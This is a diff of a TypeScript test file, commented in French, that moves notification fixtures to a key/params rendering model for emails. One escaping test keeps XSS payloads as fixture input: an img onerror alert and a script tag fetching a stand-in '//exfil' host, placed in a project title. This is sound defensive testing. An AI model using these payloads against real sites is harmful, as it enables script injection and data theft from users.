@@ -30,8 +30,15 @@ function mkNotification(
     data: {
       userId,
       type: over.type ?? "MILESTONE_RELEASED",
-      title: `Étape validée — test ${RUN}`,
-      body: "Le virement part sur ton compte Stripe.",
+      // key/params : le sujet de l'email est le RENDU (langue du destinataire).
+      key: "milestoneReleased.final",
+      params: {
+        order: 1,
+        amountMinor: 6000,
+        currency: "usd",
+        projectTitle: `test ${RUN}`,
+        nextTitle: null,
+      },
       href: "/projects/test",
       readAt: over.readAt,
       emailedAt: over.emailedAt,
@@ -57,13 +64,21 @@ afterAll(async () => {
 describe("le HTML des emails n'accepte pas le balisage des membres", () => {
   it("échappe le titre et le corps, qui reprennent du texte écrit par un membre", async () => {
     const membre = await mkUser();
-    // Un titre de projet est libre : c'est lui qui arrive dans `title`.
+    // Un titre de projet est libre : il voyage désormais dans PARAMS et
+    // traverse le rendu avant l'échappement — l'invariant reste le même :
+    // l'échappement s'applique APRÈS interpolation, jamais avant.
     await prisma.notification.create({
       data: {
         userId: membre.id,
         type: "MILESTONE_RELEASED",
-        title: `<img src=x onerror="alert(1)"> ${RUN}`,
-        body: '</p><script>fetch("//exfil")</script><p>',
+        key: "milestoneReleased.final",
+        params: {
+          order: 1,
+          amountMinor: 100,
+          currency: "usd",
+          projectTitle: `<img src=x onerror="alert(1)"> </p><script>fetch("//exfil")</script><p> ${RUN}`,
+          nextTitle: null,
+        },
         href: "/projects/test",
       },
     });
@@ -99,7 +114,7 @@ describe("emails des notifications majeures", () => {
 
     const mesEnvois = sent.filter((s) => s.to === user.email);
     expect(mesEnvois).toHaveLength(1);
-    expect(mesEnvois[0].subject).toContain("Étape validée");
+    expect(mesEnvois[0].subject).toContain("validée");
 
     const après = await prisma.notification.findUniqueOrThrow({ where: { id: majeure.id } });
     expect(après.emailedAt).not.toBeNull();
